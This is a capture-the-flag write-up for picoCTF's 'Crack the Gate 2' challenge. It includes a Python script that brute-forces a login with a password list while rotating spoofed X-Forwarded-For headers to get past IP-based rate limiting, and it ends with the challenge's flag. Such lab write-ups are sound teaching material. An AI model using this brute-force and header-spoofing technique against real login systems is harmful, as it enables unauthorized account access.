<h1>Crack the Gate 2</h1>
<h3>Decription</h3>
<label>The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. Weâ€™ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.
The website is running <a href='http://amiable-citadel.picoctf.net:57979/'>here</a>. Can you try to log in?.
Download the passwords list <a href='https://challenge-files.picoctf.net/c_amiable_citadel/746f8b0aa96c3b87d65ff8a61b25af413ae301599fe6a3434128926295901ba5/passwords.txt'>here</a>.
</label>
<h3>Solution</h3>
<label>Bruteforce dengan header X-Forwarded-For dan Password berbeda</label>

```python3
import requests
import json

url = 'http://amiable-citadel.picoctf.net:57979/login'
file_password = open('passwords.txt','r').readlines()
list_ip = ['127.0.0.'+str(i+1) for i in range(255)]
for ip,pass_ in zip(list_ip,file_password):
    headers = {
        "X-forwarded-for":ip
    }
    data = {
        "email":"ctf-player@picoctf.org",
        "password":pass_.strip('\n')
    }
    res = requests.post(url, data=data, headers=headers).text
    print(res)
```
<h3>Flag</h3>
<pre>
picoCTF{xff_byp4ss_brut3_3b2dc94d}
</pre>
